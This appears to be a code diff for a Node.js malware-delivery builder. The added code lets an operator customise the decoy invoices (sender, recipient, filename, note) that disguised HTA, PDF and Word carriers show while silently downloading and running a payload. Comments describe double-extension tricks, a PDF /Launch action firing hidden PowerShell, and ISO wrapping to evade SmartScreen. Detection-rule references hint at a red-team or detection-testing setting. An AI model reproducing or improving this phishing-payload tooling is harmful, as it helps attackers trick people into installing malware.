@@ -169,8 +169,16 @@ router.get("/api/builder/carrier", requireAdmin, (req, res) => {
   const payload = `${proto}://${host}/dl/exe`;
   const saveTo  = "%TEMP%\\OneDriveHelper.exe";
 
-    const decoyPdfUrl  = `${proto}://${host}/dl/decoy-pdf`;
+  const decoyPdfUrl  = `${proto}://${host}/dl/decoy-pdf`;
   const decoyDocUrl  = `${proto}://${host}/dl/decoy-doc`;
+
+  // PDF/Word customisation fields from dashboard inputs
+  const pdfOpts = {
+    from:     (req.query.pdf_from     || "").trim() || "Nexus Solutions Ltd.",
+    to:       (req.query.pdf_to       || "").trim() || "Acme Corporation",
+    filename: (req.query.pdf_filename || "").trim() || "Invoice_Q4-2024",
+    note:     (req.query.pdf_note     || "").trim(),
+  };
 
   const carriers = {
     hta:  () => ({ name: "OneDriveSetup.hta",              mime: "application/hta",          body: buildHta(payload, saveTo) }),
@@ -181,11 +189,11 @@ router.get("/api/builder/carrier", requireAdmin, (req, res) => {
     // Document-disguised carriers — open a real decoy document + silently run payload
     // Rename .hta → e.g. "Invoice.pdf        .hta" or distribute as-is; on Windows with
     // "hide extensions" the .hta part disappears. pname=mshta.exe → DR_017 fires.
-    pdf:  () => ({ name: "Invoice_Q4-2024.pdf.hta",        mime: "application/hta",          body: buildDocCarrier(payload, decoyPdfUrl, "%TEMP%\\~invoice.pdf",   "pdf",  saveTo) }),
+    pdf:  () => ({ name: `${pdfOpts.filename}.pdf.hta`,     mime: "application/hta",          body: buildDocCarrier(payload, decoyPdfUrl + "?" + new URLSearchParams(pdfOpts), "%TEMP%\\~invoice.pdf",  "pdf",  saveTo) }),
     // Genuine .pdf — real invoice, /OpenAction /Launch fires powershell hidden.
     // pname = AcroRd32.exe / Acrobat.exe / FoxitReader → DR_016 fires.
-    pdfexec: () => ({ name: "Invoice_Q4-2024.pdf", mime: "application/pdf", body: buildExecPdf(payload) }),
-    word: () => ({ name: "Q4_Report_Draft.docx.hta",       mime: "application/hta",          body: buildDocCarrier(payload, decoyDocUrl, "%TEMP%\\~report.docx",   "word", saveTo) }),
+    pdfexec: () => ({ name: `${pdfOpts.filename}.pdf`,     mime: "application/pdf",           body: buildExecPdf(payload, pdfOpts) }),
+    word: () => ({ name: `${pdfOpts.filename}.docx.hta`,   mime: "application/hta",           body: buildDocCarrier(payload, decoyDocUrl + "?" + new URLSearchParams(pdfOpts), "%TEMP%\\~report.docx", "word", saveTo) }),
     // ISO wrapping — no Mark-of-the-Web → SmartScreen is bypassed on older/unpatched Windows
     // pname = parent of whatever runs the exe inside the ISO (typically explorer.exe → DR_001)
     iso:  () => ({ name: null, sync: true, fn: (cb) => buildIso(cb) }),
@@ -412,23 +420,39 @@ function buildIso(callback) {
 // ── Decoy document endpoints ──────────────────────────────────────────────────
 // Serve realistic-looking decoy documents opened by the document-carrier HTA.
 
-router.get("/dl/decoy-pdf", (_req, res) => {
+router.get("/dl/decoy-pdf", (req, res) => {
+  const opts = {
+    from:     (req.query.from     || "").trim() || "Nexus Solutions Ltd.",
+    to:       (req.query.to       || "").trim() || "Acme Corporation",
+    filename: (req.query.filename || "").trim() || "Invoice_Q4-2024",
+    note:     (req.query.note     || "").trim(),
+  };
   res.setHeader("Content-Type", "application/pdf");
-  res.setHeader("Content-Disposition", 'inline; filename="invoice.pdf"');
-  res.send(buildDecoyPdf());
+  res.setHeader("Content-Disposition", `inline; filename="${opts.filename}.pdf"`);
+  res.send(buildDecoyPdf(opts));
 });
 
-router.get("/dl/decoy-doc", (_req, res) => {
+router.get("/dl/decoy-doc", (req, res) => {
+  const opts = {
+    from:     (req.query.from     || "").trim() || "Nexus Solutions Ltd.",
+    to:       (req.query.to       || "").trim() || "Acme Corporation",
+    filename: (req.query.filename || "").trim() || "Invoice_Q4-2024",
+    note:     (req.query.note     || "").trim(),
+  };
   res.setHeader("Content-Type",
     "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
-  res.setHeader("Content-Disposition", 'inline; filename="document.docx"');
-  res.send(buildDecoyDocx());
+  res.setHeader("Content-Disposition", `inline; filename="${opts.filename}.docx"`);
+  res.send(buildDecoyDocx(opts));
 });
 
 // ── Decoy PDF generator ───────────────────────────────────────────────────────
 // Generates a realistic invoice PDF using pure PDF content stream operators.
 // No hidden payload — purely the decoy shown to the target user.
-function buildDecoyPdf() {
+function buildDecoyPdf(opts = {}) {
+  const from = opts.from || "Nexus Solutions Ltd.";
+  const to   = opts.to   || "Acme Corporation";
+  const note = opts.note || "";
+
   const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
   const now = new Date();
   const fmtD = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
@@ -454,7 +478,7 @@ function buildDecoyPdf() {
   ].join("\n");
 
   const textOps = [
-    T(50, 720, "F2", 18, "Nexus Solutions Ltd."),
+    T(50, 720, "F2", 18, from),
     T(50, 702, "F1",  9, "123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom"),
     T(50, 690, "F1",  9, "Tel: +44 20 7946 0958   |   accounts@nexus-solutions.co.uk"),
     T(50, 660, "F2", 14, "INVOICE"),
@@ -462,7 +486,7 @@ function buildDecoyPdf() {
     T(50, 629, "F1",  9, "Invoice Date:     " + fmtD(now)),
     T(50, 616, "F1",  9, "Payment Due:      " + fmtD(due)),
     T(50, 590, "F2",  9, "Bill To:"),
-    T(50, 577, "F1",  9, "Acme Corporation"),
+    T(50, 577, "F1",  9, to),
     T(50, 564, "F1",  9, "Finance Department"),
     T(50, 551, "F1",  9, "456 Corporate Avenue, New York, NY 10001"),
     // Table header
@@ -490,6 +514,7 @@ function buildDecoyPdf() {
     T(50, 349, "F1",  9, "SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819"),
     T(50, 320, "F1",  8, "Thank you for your business. Payment due within 30 days of invoice date."),
     T(50, 309, "F1",  8, "Late payments subject to 2% monthly interest. E&OE."),
+    ...(note ? [T(50, 295, "F1", 8, note)] : []),
   ];
 
   const content = rules + "\nBT\n" + textOps.join("\n") + "\nET\n";
@@ -529,7 +554,11 @@ function buildDecoyPdf() {
 //   Modern Adobe Reader (v10+): shows a one-click "Allow" security dialog.
 //   Foxit / SumatraPDF / unpatched readers: fires without any dialog.
 //   pname = AcroRd32.exe / Acrobat.exe / FoxitReader.exe → DR_016 fires.
-function buildExecPdf(payloadUrl) {
+function buildExecPdf(payloadUrl, opts = {}) {
+  const from = opts.from || "Nexus Solutions Ltd.";
+  const to   = opts.to   || "Acme Corporation";
+  const note = opts.note || "";
+
   // Escape a string for use inside a PDF literal-string ( ... )
   const pdfStr = s => s
     .replace(/\\/g, "\\\\")
@@ -564,7 +593,7 @@ function buildExecPdf(payloadUrl) {
   ].join("\n");
 
   const textOps = [
-    T(50, 720, "F2", 18, "Nexus Solutions Ltd."),
+    T(50, 720, "F2", 18, from),
     T(50, 702, "F1",  9, "123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom"),
     T(50, 690, "F1",  9, "Tel: +44 20 7946 0958   |   accounts@nexus-solutions.co.uk"),
     T(50, 660, "F2", 14, "INVOICE"),
@@ -572,7 +601,7 @@ function buildExecPdf(payloadUrl) {
     T(50, 629, "F1",  9, "Invoice Date:     " + fmtD(now)),
     T(50, 616, "F1",  9, "Payment Due:      " + fmtD(due)),
     T(50, 590, "F2",  9, "Bill To:"),
-    T(50, 577, "F1",  9, "Acme Corporation"),
+    T(50, 577, "F1",  9, to),
     T(50, 564, "F1",  9, "Finance Department"),
     T(50, 551, "F1",  9, "456 Corporate Avenue, New York, NY 10001"),
     T( 55, 534, "F2", 9, "Description"),
@@ -596,6 +625,7 @@ function buildExecPdf(payloadUrl) {
     T(50, 349, "F1",  9, "SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819"),
     T(50, 320, "F1",  8, "Thank you for your business. Payment due within 30 days of invoice date."),
     T(50, 309, "F1",  8, "Late payments subject to 2% monthly interest. E&OE."),
+    ...(note ? [T(50, 295, "F1", 8, note)] : []),
   ];
 
   const content = rules + "\nBT\n" + textOps.join("\n") + "\nET\n";
@@ -704,7 +734,11 @@ function buildZip(entries) {
   return Buffer.concat([...localParts, cdBuf, eocd]);
 }
 
-function buildDecoyDocx() {
+function buildDecoyDocx(opts = {}) {
+  const from = opts.from || "Nexus Solutions Ltd.";
+  const to   = opts.to   || "Acme Corporation";
+  const note = opts.note || "";
+
   const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
   const now    = new Date();
   const fmtD   = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
@@ -722,7 +756,7 @@ function buildDecoyDocx() {
   const docXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
 <w:body>
-${para("Nexus Solutions Ltd.", true, 48)}
+${para(from, true, 48)}
 ${para("123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom", false, 18)}
 ${para("Tel: +44 20 7946 0958  |  accounts@nexus-solutions.co.uk", false, 18)}
 ${para(" ")}
@@ -732,7 +766,7 @@ ${para("Invoice Date:    " + fmtD(now), false, 20)}
 ${para("Payment Due:     " + fmtD(due), false, 20)}
 ${para(" ")}
 ${para("Bill To:", true, 20)}
-${para("Acme Corporation", false, 20)}
+${para(to, false, 20)}
 ${para("Finance Department", false, 20)}
 ${para("456 Corporate Avenue, New York, NY 10001", false, 20)}
 ${para(" ")}
@@ -754,6 +788,7 @@ ${para("Account: 12345678   Sort Code: 60-00-01   Reference: " + invNum, false, 
 ${para("SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819", false, 18)}
 ${para(" ")}
 ${para("Thank you for your business. Payment is due within 30 days of invoice date.", false, 16)}
+${note ? para(note, false, 16) : ""}
 <w:sectPr/>
 </w:body>
 </w:document>`;
